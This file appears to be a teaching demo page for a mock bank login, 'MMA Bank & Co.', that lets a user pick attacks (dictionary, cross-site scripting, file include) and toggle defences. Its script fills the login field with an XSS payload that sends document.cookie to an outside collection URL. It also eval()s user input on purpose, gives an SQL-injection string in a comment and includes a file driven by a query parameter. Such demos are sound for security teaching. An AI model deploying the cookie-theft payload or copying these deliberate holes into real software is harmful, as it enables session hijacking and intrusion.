<?php include("header.php"); ?>
		<?php

        if (isset( $_GET['includeattack'] ) )
        {
            $format = "./includeattack/includeattack1";
        	include( $format . '.php' );
        }
        ?>

        <div class="section col-md-6 col-md-offset-3">
        	<h1 style="text-align:center">MMA Bank & Co.</h1>
        	<div class="row">

                <div class="col-md-10 col-md-offset-1">
                    
                    <div id="displayWithoutSecurity"></div>

                </div>
                
            </div>
        
            <div class="row">
            
                <div class="col-md-10 col-md-offset-1">
                    
                    <h3 style="text-align:center;">To see your accounts, please enter your login</h3>

                    <form id="formWithoutSecurity" action="processorWithoutSecurity.php" method="post" onSubmit="return submitCheck();">
	                    <div class="form-group">
	                      <label for="labelLogin">Login</label>
	                      <input type="text" class="form-control" id="loginWithoutSecurity" placeholder="Login" name="login">
	                    </div>
	                    <div class="form-group" id="divWithoutSecurity">
	                      <label id="labelPasswordWithoutSecurity" for="labelPassword">Password</label>
	                      <input type="password" class="form-control" id="passwordWithoutSecurity" placeholder="Password" name="pass">
	                    </div>
                        
                        <button type="submit" id="submitWithoutSecurity" class="btn btn-block btn-primary">Connect</button>

	                    <div class="h3 dropdown">Select your attack <i class="mdi mdi-menu-down pull-right"></i></div>
	                    <div id="radio-group" class="radio-group red" style="display:none">
	                    	<div class="radio">
							    <label><input type="radio" id="rb-dictionary" name="attack" value="dict-attack">Dictionary Attack</label>
							</div>
							<div class="radio">
							    <label><input type="radio" id="rb-xss" name="attack" value="xss-attack">Cross-site scripting</label>
							</div>
							<div class="radio">
							    <label><input type="radio" id="rb-include" name="attack" value="include-attack">Include Attack</label>
							</div>
							<div class="radio">
							    <label><input type="radio" id="rb-none" name="attack" value="no-attack">None</label>
							</div>
	                    </div>
						<hr/>
                        <div class="h3 dropdown">Select your defence(s) <i class="mdi mdi-menu-down pull-right"></i></div>
	                    <div id="checkbox-group" class="radio-group green" style="display:none">
	                    	

							<div class="checkbox">
						  		<label><input type="checkbox" id="cb-xss" value="">Prevent Cross-site scripting</label>
							</div>
							<div class="checkbox">
						  		<label><input type="checkbox" id="cb-sql" value="" name="sql">Prevent Injections SQL</label>
							</div>
							<div class="checkbox">
						  		<label><input type="checkbox" id="cb-dic" value="">Prevent Dictionary and/or Brute Force attacks</label>
							</div>
	                    </div>
                    </form>

                    <!--<button type="button" id="submitDictionaryAttack" class="btn btn-block btn-warning">Dictionary Attack</button>-->

                </div>

            </div>
<!--
            <hr style="border: 0; 
					  height: 5px; 
					  background-image: -webkit-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -moz-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -ms-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -o-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);">

            

            <hr style="border: 0; 
					  height: 5px; 
					  background-image: -webkit-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -moz-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -ms-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);
					  background-image: -o-linear-gradient(left, #ffffff, #8c8b8b, #ffffff);">
-->
            <div class="row">

                <div class="col-md-10 col-md-offset-1">

                    <button type="button" id="clear" class="btn btn-block btn-warning">Clear everything</button>

                </div>

            </div>
            
        </div>

        <!-- JQuery JS -->
        <script src="js/jquery.js"></script>

        <!-- JQuery cookie JS -->
        <script src="js/jquery.cookie.js"></script>

        <script>
        $(document).ready(function(){
			$(".dropdown").click(function(){	
				var mdi = $(this).find(".mdi");
			
				if(mdi.hasClass("mdi-menu-down")){
					mdi.removeClass("mdi-menu-down");
					mdi.addClass("mdi-menu-up");
				}
				else{
					mdi.removeClass("mdi-menu-up");
					mdi.addClass("mdi-menu-down");
				}
				$(this).next(".radio-group").slideToggle();
			});

        	/* XSS Attack - Put malicious JS in login input */
            $('input[type=radio][name=attack]').change(function() {
				switch(this.value){
		        	case 'xss-attack' :
						$("#loginWithoutSecurity").val("window.open(\"http://asso.fanabriques.fr/uha/xssattack/xss.php?c=\"+document.cookie);");
						break;
				}
		    });
			
			$('#cb-dic').change(function() {
				if($(this).is(":checked")){
					$("#passwordWithoutSecurity").addClass("protected");
					checkPasswordValid($("#passwordWithoutSecurity"));
					$("#labelPasswordWithoutSecurity").html("Password - 8 chars & 1 digit & 1 uppercase & 1 lowercase min");
				}
				else{
					$("#passwordWithoutSecurity").removeClass("protected");
					$("#passwordWithoutSecurity").parent().removeClass("has-error");
					$("#submitWithoutSecurity").removeClass("disabled");
					$("#labelPasswordWithoutSecurity").html("Password");
				}
		    });
			
			/* Handle the event when the form with security is submitted */
			/* Example SQL injection ==> mickael' or 1=1 -- ' */
            
			
			/* Handle the event when writting the password */
			$('#passwordWithoutSecurity').keyup(function(){
				checkPasswordValid($(this));
			});
			
			function checkPasswordValid(el){
				if($(el).hasClass("protected")){
					var inputVal = $(el).val();
					//var div = $('#divWithoutSecurity')[0];
					//var regex = /^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/;
					var regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[$@$!%*?&])[A-Za-z\d$@$!%*?&]{8,}$/;
					if(!regex.test(inputVal)) {
						console.log("Not good enough ...");
						$('#divWithoutSecurity').removeClass("has-success");
						$('#divWithoutSecurity').addClass("has-error");
						$('#submitWithoutSecurity').addClass("disabled");
					}else{
						console.log("Good !!!");
						//div.removeClass().addClass("form-group has-success");
						$('#divWithoutSecurity').removeClass("has-error");
						$('#divWithoutSecurity').addClass("has-success");
						$('#submitWithoutSecurity').removeClass("disabled");
					}
				}
			}

			/* Handle the dictionary attack */
			/*$('#submitDictionaryAttack').click(function(){
				var login = $("#loginWithoutSecurity").val();
				var dataString = 'login='+ login;
				if(login == '')
				{
					$("#displayWithoutSecurity").html("<h3 style=\"text-align:center;\">Need a login at least</h3>");
				}
				else
				{
					$.ajax({
						type: "POST",
						url: "dictionaryattack/dictionary.php",
						data: dataString,
						cache: false,
						success: function(result){
							$("#displayWithoutSecurity").html(result);
						}
					});
				}
				return false;
			});*/

			/* clear everything */
			$('#clear').click(function(){

				if (!!$.cookie('username')) {
					$.removeCookie('username', { path: '/' });
				}

				if (!!$.cookie('password')) {
					$.removeCookie('password', { path: '/' });
				}

				$("#displayWithoutSecurity").html("");
				$("#formWithoutSecurity")[0].reset();
			});

        });
		
		function submitCheck(){

            	if($("#rb-dictionary").is(":checked")){
            		var login = $("#loginWithoutSecurity").val();
					var dataString = 'login='+ login;
					if(login == '')
					{
						$("#displayWithoutSecurity").html("<h4 class='bg-danger message'>Need a login at least</h4>");
					}
					else
					{
						$("#displayWithoutSecurity").html("Searching in progress...");
						$.ajax({
							type: "POST",
							url: "dictionaryattack/dictionary.php",
							data: dataString,
							cache: false,
							success: function(result){
								result = result.split("&*###*&");
								var data = result[0];
								var name = result[1];
								var pass = result[2];
								$("#displayWithoutSecurity").html(data);
								$("#loginWithoutSecurity").val(name);
								$("#passwordWithoutSecurity").val(pass);
								$("#rb-none").attr("checked", "checked");
								setTimeout(function(){
									$("#formWithoutSecurity").submit();
								}, 2000);
							}
						});
						return false;
					}
					return false;
            	} 
				else {
            		var login = $("#loginWithoutSecurity").val();
					var pass = $("#passwordWithoutSecurity").val();
					var prevent_sql = "no";

					if($("#cb-sql").is(':checked')){
						prevent_sql = "yes";
					}

					if($("#rb-xss").is(":checked") && !$("#cb-xss").is(':checked')){
						try {
							eval(login);
						} catch (err) {
							console.log("message : " + err + " and is not a javascript function");
						}

						try {
							eval(pass);
						} catch (err) {
							console.log("message : " + err + " and is not a javascript function");
						}
					}
					
					var dataString = 'login='+ login + '&pass='+ pass + '&sql='+ prevent_sql;
					if(login == '' || pass == '')
					{
						$("#displayWithoutSecurity").html("<h4 class='bg-warning message' >Please fill all fields</h4>");
						return false;
					}
					else
					{
						if($("#rb-include").is(":checked")){
							window.location = "http://uha.artgalerielataniere.fr/?includeattack=1";
						}
						return true;
						/*
						else{
							$.ajax({
								type: "POST",
								url: "processorWithoutSecurity.php",
								data: dataString,
								cache: false,
								success: function(result){
									$("#displayWithoutSecurity").html(result);
								}
							});
						}*/
					}
            	}				
            }
        </script>
<?php include("footer.php"); ?>